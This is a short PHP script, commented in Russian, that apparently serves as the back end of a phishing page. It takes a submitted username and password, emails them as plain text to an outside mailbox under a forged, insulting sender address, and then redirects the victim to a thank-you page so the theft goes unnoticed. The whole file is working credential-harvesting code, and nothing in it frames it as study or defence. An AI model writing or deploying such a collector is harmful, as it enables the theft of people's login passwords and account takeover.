<?php
//Принимаем постовые данные
$name=$_POST['name'];
$pass=$_POST['pass'];
$form = $_POST['form'];
//Тут указываем на какой ящик посылать письмо
$to = "samvelbala@bk.ru";
//Далее идет тема и само сообщение
// Тема письма
$subject = "Заявка с сайта";
// Сообщение письма
$message = "
Форма = ".htmlspecialchars($form)."<br />
Имя пользователя: ".htmlspecialchars($name)."<br />
Пароль: ".htmlspecialchars($pass);
// Отправляем письмо при помощи функции mail();
$headers = "From: Mudaka.ru <putin@mudak.ru>\r\nContent-type: text/html; charset=UTF-8 \r\n";
mail ($to, $subject, $message, $headers);
// Перенаправляем человека на страницу благодарности и завершаем скрипт
header('Location: thanks.html');
exit();
?>